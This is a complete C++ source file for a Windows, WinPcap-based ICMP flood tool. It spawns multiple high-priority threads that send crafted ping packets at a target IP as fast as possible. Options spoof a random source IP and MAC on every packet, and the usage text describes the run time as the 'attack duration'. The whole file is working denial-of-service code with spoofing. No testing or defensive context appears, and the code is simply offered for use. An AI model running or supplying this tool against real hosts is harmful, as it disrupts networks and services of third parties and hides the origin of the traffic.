// g++ -g <name>.cpp -o <name>.exe -I"./Include" -L"./Lib/x64" -lwpcap -lws2_32 -liphlpapi
#define HAVE_REMOTE
#include <pcap.h>
#include <iostream>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <memory>
#include <cstring>
#include <cstdint>
#include <cstdlib>
#include <ctime>
#include <cstdio>
#include <winsock2.h>
#include <iphlpapi.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#pragma pack(push, 1)
struct ether_header {
    uint8_t  ether_dhost[6];
    uint8_t  ether_shost[6];
    uint16_t ether_type;
};

struct iphdr {
    uint8_t  ihl:4;
    uint8_t  version:4;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct icmphdr {
    uint8_t  type;
    uint8_t  code;
    uint16_t check;
    uint16_t id;
    uint16_t seq;
};
#pragma pack(pop)

// Вспомогательные функции
bool get_local_mac(uint32_t ip, uint8_t mac[6]) {
    DWORD dwSize = 0;
    PIP_ADAPTER_INFO pAdapterInfo = nullptr;
    if (GetAdaptersInfo(nullptr, &dwSize) == ERROR_BUFFER_OVERFLOW) {
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(dwSize);
        if (GetAdaptersInfo(pAdapterInfo, &dwSize) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
            while (pAdapter) {
                IP_ADDR_STRING* pIp = &pAdapter->IpAddressList;
                while (pIp) {
                    if (inet_addr(pIp->IpAddress.String) == ip) {
                        memcpy(mac, pAdapter->Address, 6);
                        free(pAdapterInfo);
                        return true;
                    }
                    pIp = pIp->Next;
                }
                pAdapter = pAdapter->Next;
            }
        }
        free(pAdapterInfo);
    }
    return false;
}

std::string get_interface_name(uint32_t ip) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs, *dev;
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &alldevs, errbuf) == -1)
        return "";
    for (dev = alldevs; dev; dev = dev->next) {
        pcap_addr_t *addr;
        for (addr = dev->addresses; addr; addr = addr->next) {
            if (addr->addr && addr->addr->sa_family == AF_INET) {
                struct sockaddr_in *sin = (struct sockaddr_in*)addr->addr;
                if (sin->sin_addr.s_addr == ip) {
                    std::string name = dev->name;
                    pcap_freealldevs(alldevs);
                    return name;
                }
            }
        }
    }
    pcap_freealldevs(alldevs);
    return "";
}

uint16_t checksum(uint16_t *ptr, int len) {
    uint32_t sum = 0;
    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    if (len)
        sum += *(uint8_t*)ptr;
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);
    return ~sum;
}

bool parse_mac_strict(const char* str, uint8_t mac[6]) {
    unsigned int tmp[6] = {};
    int consumed = 0;
    if (sscanf(str, "%2x:%2x:%2x:%2x:%2x:%2x%n",
               &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5], &consumed) != 6) {
        return false;
    }
    if (str[consumed] != '\0') {
        return false;
    }
    for (int i = 0; i < 6; ++i) {
        mac[i] = static_cast<uint8_t>(tmp[i]);
    }
    return true;
}

void print_mac(const uint8_t mac[6]) {
    for (int i = 0; i < 6; ++i) {
        if (i) std::printf(":");
        std::printf("%02X", mac[i]);
    }
    std::printf("\n");
}


class PrebuiltPacket {
public:
    static constexpr size_t PACKET_SIZE = sizeof(ether_header) + sizeof(iphdr) + sizeof(icmphdr);
    alignas(64) uint8_t buffer[PACKET_SIZE];
    size_t size;
    size_t src_mac_offset;
    size_t src_ip_offset;
    size_t icmp_id_offset;
    size_t icmp_seq_offset;
    uint32_t src_ip;
    uint32_t dst_ip;
    uint8_t dst_mac[6];

    PrebuiltPacket(uint32_t src_ip, uint8_t* src_mac, uint32_t dst_ip, uint8_t* dst_mac)
        : src_ip(src_ip), dst_ip(dst_ip) {
        memcpy(this->dst_mac, dst_mac, 6);
        size = PACKET_SIZE;
        memset(buffer, 0, size);

        ether_header* eth = (ether_header*)buffer;
        memcpy(eth->ether_dhost, dst_mac, 6);
        memcpy(eth->ether_shost, src_mac, 6);
        eth->ether_type = htons(0x0800);

        iphdr* ip = (iphdr*)(buffer + sizeof(ether_header));
        ip->version = 4;
        ip->ihl = 5;
        ip->tos = 0;
        ip->tot_len = htons(sizeof(iphdr) + sizeof(icmphdr));
        ip->id = 0;
        ip->frag_off = 0;
        ip->ttl = 64;
        ip->protocol = 1; // ICMP
        ip->check = 0;
        ip->saddr = src_ip;
        ip->daddr = dst_ip;

        icmphdr* icmp = (icmphdr*)(buffer + sizeof(ether_header) + sizeof(iphdr));
        icmp->type = 8; // Echo request
        icmp->code = 0;
        icmp->check = 0;
        icmp->id = 0;
        icmp->seq = 0;

        src_mac_offset = offsetof(ether_header, ether_shost);
        src_ip_offset = sizeof(ether_header) + offsetof(iphdr, saddr);
        icmp_id_offset = sizeof(ether_header) + sizeof(iphdr) + offsetof(icmphdr, id);
        icmp_seq_offset = sizeof(ether_header) + sizeof(iphdr) + offsetof(icmphdr, seq);
    }

    void set_src_mac(const uint8_t mac[6]) {
        memcpy(buffer + src_mac_offset, mac, 6);
    }

    void set_src_ip(uint32_t ip) {
        src_ip = ip;
        memcpy(buffer + src_ip_offset, &ip, 4);
    }

    void set_icmp_id(uint16_t id) {
        uint16_t net_id = htons(id);
        memcpy(buffer + icmp_id_offset, &net_id, 2);
    }

    void set_icmp_seq(uint16_t seq) {
        uint16_t net_seq = htons(seq);
        memcpy(buffer + icmp_seq_offset, &net_seq, 2);
    }

    void recalc_checksum() {
        iphdr* ip = (iphdr*)(buffer + sizeof(ether_header));
        ip->check = 0;
        ip->check = checksum((uint16_t*)ip, sizeof(iphdr));

        icmphdr* icmp = (icmphdr*)(buffer + sizeof(ether_header) + sizeof(iphdr));
        icmp->check = 0;

        icmp->check = checksum((uint16_t*)icmp, sizeof(icmphdr));
    }
};

class FloodEngine {
private:
    pcap_t* pcap_handle;
    PrebuiltPacket packet_template;
    std::atomic<uint64_t>& total_packets_sent;
    std::atomic<bool>& stop_flag;
    uint16_t counter;
    bool random_ip;
    bool random_mac;

public:
    FloodEngine(pcap_t* handle, uint32_t src_ip, uint8_t* src_mac, uint32_t dst_ip, uint8_t* dst_mac,
                int thread_index, std::atomic<uint64_t>& total_counter,
                std::atomic<bool>& stop, bool random_ip_flag, bool random_mac_flag)
        : packet_template(src_ip, src_mac, dst_ip, dst_mac),
          pcap_handle(handle), total_packets_sent(total_counter), stop_flag(stop),
          counter(thread_index * 1000), random_ip(random_ip_flag), random_mac(random_mac_flag) {}

    void start(int core_id) {
        HANDLE hThread = GetCurrentThread();
        SetThreadAffinityMask(hThread, 1ULL << core_id);
        SetThreadPriority(hThread, THREAD_PRIORITY_HIGHEST);

        uint32_t seed = time(nullptr) + core_id * 1000;

        auto lcg = [](uint32_t& s) -> uint32_t {
            s = s * 1103515245 + 12345;
            return (s >> 16) & 0x7FFF;
        };

        while (!stop_flag.load(std::memory_order_relaxed)) {
            if (random_ip) {
                uint32_t random_ip_val = (lcg(seed) & 0xFF) << 24 |
                                         (lcg(seed) & 0xFF) << 16 |
                                         (lcg(seed) & 0xFF) << 8 |
                                         (lcg(seed) & 0xFF);
                packet_template.set_src_ip(random_ip_val);
            }

            if (random_mac) {
                uint8_t mac[6];
                mac[0] = (lcg(seed) & 0xFE);
                for (int i = 1; i < 6; ++i) {
                    mac[i] = lcg(seed) & 0xFF;
                }
                packet_template.set_src_mac(mac);
            }

            uint16_t id = counter++;
            packet_template.set_icmp_id(id);
            packet_template.set_icmp_seq(id);

            packet_template.recalc_checksum();

            if (pcap_sendpacket(pcap_handle, packet_template.buffer, (int)packet_template.size) == 0) {
                total_packets_sent.fetch_add(1, std::memory_order_relaxed);
            } else {
                static thread_local uint32_t error_counter = 0;
                if ((++error_counter % 1000) == 1) {
                    std::cerr << "pcap_sendpacket error in thread " << std::this_thread::get_id()
                              << " (sampled): " << pcap_geterr(pcap_handle) << std::endl;
                }
            }
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc < 5) {
        std::cerr << "Usage: " << argv[0]
                  << " <src_ip> <dst_ip> <threads> <duration_sec> [dst_mac] [--random-ip] [--random-mac]\n"
                  << "  src_ip      - source IP address (can be 0.0.0.0 if --random-ip is used)\n"
                  << "  dst_ip      - target IP\n"
                  << "  threads     - number of threads\n"
                  << "  duration_sec- attack duration in seconds (0 for infinite)\n"
                  << "  dst_mac     - destination MAC (optional, default broadcast)\n"
                  << "  --random-ip - generate random source IP for each packet\n"
                  << "  --random-mac- generate random source MAC for each packet\n"
                  << "Example: " << argv[0] << " 192.168.1.100 192.168.1.1 4 60 00:11:22:33:44:55 --random-ip --random-mac\n";
        return 1;
    }

    uint32_t src_ip = inet_addr(argv[1]);
    uint32_t dst_ip = inet_addr(argv[2]);
    int num_threads = atoi(argv[3]);
    int duration = atoi(argv[4]);
    if (num_threads <= 0) {
        std::cerr << "threads must be > 0\n";
        return 1;
    }
    if (duration < 0) {
        std::cerr << "duration_sec must be >= 0\n";
        return 1;
    }

    uint8_t dst_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    bool random_ip = false;
    bool random_mac = false;

    for (int i = 5; i < argc; i++) {
        if (strcmp(argv[i], "--random-ip") == 0) {
            random_ip = true;
        } else if (strcmp(argv[i], "--random-mac") == 0) {
            random_mac = true;
        } else {
            uint8_t parsed_mac[6] = {};
            if (parse_mac_strict(argv[i], parsed_mac)) {
                memcpy(dst_mac, parsed_mac, sizeof(dst_mac));
            } else {
                std::cerr << "Warning: unknown argument '" << argv[i] << "'\n";
            }
        }
    }

    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

    char errbuf[PCAP_ERRBUF_SIZE];
    if (pcap_init(PCAP_CHAR_ENC_UTF_8, errbuf) == -1) {
        std::cerr << "pcap_init failed: " << errbuf << std::endl;
        return 1;
    }

    std::string ifname;
    uint8_t src_mac[6] = {0};

    if (src_ip != 0) {
        ifname = get_interface_name(src_ip);
        if (ifname.empty()) {
            std::cerr << "Could not find interface with IP " << argv[1] << std::endl;
            return 1;
        }
        if (!random_mac) {
            if (!get_local_mac(src_ip, src_mac)) {
                std::cerr << "Could not get local MAC for IP " << argv[1] << std::endl;
                return 1;
            }
        }
    } else {
        pcap_if_t *alldevs;
        if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &alldevs, errbuf) == -1) {
            std::cerr << "pcap_findalldevs_ex failed: " << errbuf << std::endl;
            return 1;
        }
        if (alldevs) {
            ifname = alldevs->name;
            pcap_freealldevs(alldevs);
        } else {
            std::cerr << "No interfaces found\n";
            return 1;
        }
    }

    pcap_t* temp_handle = pcap_open(ifname.c_str(), 65536, PCAP_OPENFLAG_MAX_RESPONSIVENESS,
                                     1000, nullptr, errbuf);
    if (!temp_handle) {
        std::cerr << "pcap_open failed: " << errbuf << std::endl;
        return 1;
    }
    if (pcap_datalink(temp_handle) != DLT_EN10MB) {
        std::cerr << "Interface doesn't support Ethernet frames" << std::endl;
        pcap_close(temp_handle);
        return 1;
    }
    pcap_close(temp_handle);

    std::vector<pcap_t*> pcap_handles;
    for (int i = 0; i < num_threads; i++) {
        pcap_t* handle = pcap_open(ifname.c_str(), 65536, PCAP_OPENFLAG_MAX_RESPONSIVENESS,
                                   1000, nullptr, errbuf);
        if (!handle) {
            std::cerr << "Failed to open interface for thread " << i << ": " << errbuf << std::endl;
            for (auto h : pcap_handles) pcap_close(h);
            return 1;
        }
        pcap_handles.push_back(handle);
    }

    std::cout << "Using interface: " << ifname << std::endl;
    std::cout << "Destination MAC: ";
    print_mac(dst_mac);
    std::cout << "Random source IP: " << (random_ip ? "yes" : "no") << "\n";
    std::cout << "Random source MAC: " << (random_mac ? "yes" : "no") << "\n";

    std::atomic<uint64_t> total_packets_sent(0);
    std::atomic<bool> stop_flag(false);
    std::vector<std::thread> workers;

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    DWORD numCores = sysInfo.dwNumberOfProcessors;

    auto start_time = std::chrono::steady_clock::now();

    std::vector<std::unique_ptr<FloodEngine>> engines;
    engines.reserve(num_threads);
    for (int i = 0; i < num_threads; i++) {
        int core = i % numCores;
        engines.emplace_back(std::make_unique<FloodEngine>(
            pcap_handles[i],
            src_ip,
            src_mac,
            dst_ip,
            dst_mac,
            i,
            total_packets_sent,
            stop_flag,
            random_ip,
            random_mac
        ));
        workers.emplace_back(&FloodEngine::start, engines.back().get(), core);
    }

    if (duration > 0) {
        std::this_thread::sleep_for(std::chrono::seconds(duration));
        stop_flag = true;
    } else {
        std::cout << "Press Enter to stop...\n";
        std::cin.get();
        stop_flag = true;
    }

    for (auto& w : workers) {
        if (w.joinable()) w.join();
    }

    auto end_time = std::chrono::steady_clock::now();
    auto elapsed_ms = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time).count();
    uint64_t total_packets = total_packets_sent.load();
    if (elapsed_ms == 0) {
        elapsed_ms = 1;
    }
    double pps = total_packets * 1000.0 / elapsed_ms;
    double mbps = (pps * PrebuiltPacket::PACKET_SIZE * 8) / 1'000'000;

    std::cout << "\n--- Results ---\n";
    std::cout << "Total packets sent: " << total_packets << "\n";
    std::cout << "Duration: " << elapsed_ms << " ms\n";
    std::cout << "Throughput: " << pps << " pps\n";
    std::cout << "Bandwidth: " << mbps << " Mbps\n";

    for (auto h : pcap_handles) pcap_close(h);
    return 0;
}
